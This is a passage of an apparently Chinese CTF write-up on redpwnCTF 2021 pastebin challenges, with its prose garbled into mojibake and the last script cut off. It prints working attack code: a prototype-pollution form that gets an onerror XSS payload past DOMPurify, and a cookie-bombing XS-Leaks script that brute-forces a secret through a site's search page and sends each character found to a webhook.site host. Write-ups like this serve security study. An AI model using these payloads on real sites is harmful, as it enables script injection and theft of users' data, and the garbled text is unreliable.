&lt;p>æ˜¾ç„¶å•Š è¿˜æ˜¯xssï¼Œä½†æ˜¯ç”¨äº†DOMPurifyï¼Œå¹¶ä¸”è¿™ä¸ªç‰ˆæœ¬ä¹Ÿå¾ˆæ–° ä¹‹å‰çš„ä¸€äº›bugä¹Ÿæ²¡æ³•åˆ©ç”¨ï¼Œ&lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#pastebin-2-social-edition">å‚è€ƒwp&lt;/a>&lt;/p>
&lt;p>çœ‹æºç &lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806171955901.png" alt="image-20210806171955901">&lt;/p>
&lt;p>æ³¨æ„åˆ°è¿™é‡Œï¼Œå¦‚æœæœ‰é”™è¯¯ å°±ä¼šè®¾ç½®&lt;code>errorContainer.innerHTML = message;&lt;/code>ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶error message å°±èƒ½åšåˆ°xssäº†ï¼›è¿™é‡Œåˆ©ç”¨åŸå‹æ±¡æŸ“prototype pollutionï¼Œå³ä½¿DOMPurifyå¯ä»¥é˜»æŒ¡ä¸€äº›xsså¸¸ç”¨çš„æ ‡ç­¾æˆ–è€…å±æ€§ï¼Œä¹Ÿé˜»æ­¢ä¸äº†åŸå‹æ±¡æŸ“&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">fieldset&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;__proto__&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;message&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;img src=x onerror=&amp;#39;alert(1)&amp;#39;&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">fieldset&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;Post Comment&amp;#34;&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘ä»¬å¯ä»¥æŠŠerroræ±¡æŸ“æˆä»»æ„å€¼ï¼Œmessageæ±¡æŸ“ä¸ºxsså†…å®¹å’Œpayload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">fieldset&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;__proto__&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;message&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;img src=x onerror=&amp;#39;alert(1)&amp;#39;&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">fieldset&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;Post Comment&amp;#34;&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#111">{}[&lt;/span>&lt;span style="color:#d88200">&amp;#34;__proto__&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">{}[&lt;/span>&lt;span style="color:#d88200">&amp;#34;__proto__&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;message&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;img src=x onerror=&amp;#39;alert(1)&amp;#39;&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å½“è¯·æ±‚è¢«è§¦å‘æ—¶ï¼Œerrorå’Œmessageå°±éƒ½æ˜¯æˆ‘ä»¬è‡ªå®šçš„å€¼äº†ï¼›è™½ç„¶DOMPurifyä¼šå¯¹&lt;code>__proto__&lt;/code>è¿›è¡Œç§»é™¤ï¼Œä½†æ˜¯å› ä¸ºä¸Šé¢&lt;code>const fieldsetName = decodeURIComponent(fieldset.name);&lt;/code>ï¼Œæ‰€ä»¥å†å¯¹&lt;code>__proto__&lt;/code>æ¥ä¸€æ‰‹urlencodeå°±èƒ½ç»•è¿‡äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">fieldset&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;%255F_proto__&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;message&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;img src=x onerror=&amp;#39;alert(1)&amp;#39;&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;Post Comment&amp;#34;&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">fieldset&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="webpastebin-3">***web/pastebin-3&lt;/h2>
&lt;blockquote>
&lt;p>Boy, there sure are a lot of pastebins. Gotta think of new themes&amp;hellip;&lt;/p>
&lt;p>&lt;em>Please put a reasonably secure password when making an account&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;p>è¿˜æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„é¡µé¢ create pasteï¼Œå¢åŠ äº†ä¸€ä¸ªæœç´¢çš„åŠŸèƒ½&lt;/p>
&lt;p>å…ˆçœ‹/viewè·¯ç”±&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808142853227.png" alt="image-20210808142853227">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808141859178.png" alt="image-20210808141859178">&lt;/p>
&lt;p>æˆ‘ä»¬çš„ä¾¿ç­¾ æ€»ä½“ä¼šä»¥ä¸€ä¸ªurlçš„å½¢å¼æ”¾å…¥iframeä¸­ï¼Œæ¥ç€å»çœ‹çœ‹sanbox_urlçš„æ¸²æŸ“æƒ…å†µ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808141709394.png" alt="image-20210808141709394">&lt;/p>
&lt;p>è€Œäº®ç‚¹æ˜¯ï¼Œæˆ‘ä»¬çš„pasteåˆè¢«ç›´æ¥æ”¾å…¥åå¼•å·ä¸­é—´äº†ï¼Œå¦‚æœæˆ‘ä»¬ç”¨ç±»ä¼¼&lt;code>${alert(1)}&lt;/code>çš„ä¸œè¥¿ç›´æ¥å°±å¯ä»¥è·‘jsäº†ï¼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808142359209.png" alt="image-20210808142359209">&lt;/p>
&lt;p>ç°åœ¨æˆ‘ä»¬æœ‰äº†å¯ä»¥æ“ä½œjsä»£ç çš„åœ°æ–¹â€”â€”ä½†æ˜¯è¿™æ˜¯åœ¨sandboxä¸­ï¼Œä¸ä¸»é¡µé¢å¹¶ä¸æ˜¯åŒæºçš„ğŸ¤”&lt;/p>
&lt;p>å†çœ‹çœ‹æ–°åŠ å…¥çš„searchåŠŸèƒ½&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808143003626.png" alt="image-20210808143003626">&lt;/p>
&lt;p>â€”â€”â€”â€”è¿™é‡Œè¦å…ˆæ’æ’­ä¸€æ¡çŸ¥è¯†äº† &lt;a href="https://xsleaks.dev/">XSLeaks&lt;/a>ï¼ˆæ›´å¤šçš„ç›¸å…³å‚è€ƒé“¾æ¥æ”¾åˆ°åé¢äº†ï¼‰ï¼Œä¸€ä¸ªå¸¸è§çš„xsleakæ”»å‡»è¯¦è§&lt;a href="https://xsleaks.dev/docs/attacks/error-events/">error events&lt;/a>&lt;/p>
&lt;p>&lt;em>Cross-site leaks (aka XS-Leaks, XSLeaks) are a class of vulnerabilities derived from side-channels built into the web platform. They take advantage of the webâ€™s core principle of composability, which allows websites to interact with each other, and abuse legitimate mechanisms to infer information about the user. â€”â€”from XSLeaks wiki&lt;/em>&lt;/p>
&lt;p>/searchä½¿ç”¨çš„æ˜¯flaskä¸­çš„flash()æ¶ˆæ¯é—ªç°æ¥å±•ç¤ºæœç´¢çš„ç»“æœï¼Œå®ƒä¼šå­˜å‚¨åœ¨session cookieä¸­ï¼Œå¦‚æœæ¶ˆæ¯æ¯”ä¼šè¯cookieå¤§çš„è¯ä¼šå¯¼è‡´æ¶ˆæ¯é—ªç°é™é»˜å¤±è´¥â€”â€”æˆ‘ä»¬åˆ©ç”¨è¿™ä¸€æ¡ç‰¹æ€§ï¼Œç”¨é•¿é•¿çš„cookieï¼Œå¦‚æœè¯·æ±‚æˆåŠŸ é‚£ä¹ˆéœ€è¦æ˜¾ç¤ºflashæ—¶cookieå°†ä¼šè¶…è¿‡é™åˆ¶æŠ¥é”™ï¼Œè€Œè¯·æ±‚å¤±è´¥ å°±åªæœ‰No results foundçŸ­çŸ­çš„ä¸€æ¡ï¼Œä¸ä¼šæŠ¥400&lt;/p>
&lt;p>æˆ‘ä»¬ç”¨XSLeaks wikiä¸Šç»™å‡ºçš„ probeError snippet&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">probeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">script&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createElement&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;script&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">src&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Onload event triggered&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onerror&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Error event triggered&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">head&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">appendChild&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è™½ç„¶åŒç«™çš„cookiesï¼ˆsame-site cookiesï¼‰é€šå¸¸ä¼šé˜»æ­¢è¿™ç§æƒ…å†µï¼Œä½†ç”±äºé¢˜ä¸­çš„sandboxæ˜¯å­åŸŸï¼Œå¹¶ä¸æ˜¯åŒç«™çš„æƒ…å†µï¼Œæ‰€ä»¥probeErrorå¯ä»¥æ£€æµ‹åˆ°ï¼Œä¸‹é¢æ˜¯è„šæœ¬&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">alphabet&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;abcdefghijklmnopqrstuvwxyz0123456789{}_ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`a=&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">repeat&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4096&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">90&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">; domain=.pastebin-3.mc.ax`&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`b=&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">repeat&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4096&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">90&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">; domain=.pastebin-3.mc.ax`&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">unset&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`a=; domain=.pastebin-3.mc.ax`&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`b=; domain=.pastebin-3.mc.ax`&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">probeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Promise&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resolve&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">script&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createElement&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;script&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">src&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">resolve&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onerror&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">resolve&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">head&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">appendChild&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">wait&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Promise&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resolve&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">setTimeout&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resolve&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;flag{c00k13_b0mb1n6_15_f4k3_vu&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">navigator&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendBeacon&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;https://webhook.site/e66e7e4f-1004-411a-86c9-71df69f20dd7?loaded&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">prefix&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">endsWith&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;}&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#75af00">alphabet&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">attempt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">prefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">alphabet&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">subwindow&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://pastebin-3.mc.ax/search?query=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">encodeURIComponent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">attempt&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">wait&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">500&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">subwindow&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">probeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://pastebin-3.mc.ax/home&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">navigator&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendBeacon&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;https://webhook.site/e66e7e4f-1004-411a-86c9-71df69f20dd7?&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">attempt&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">unset&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">attempt&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
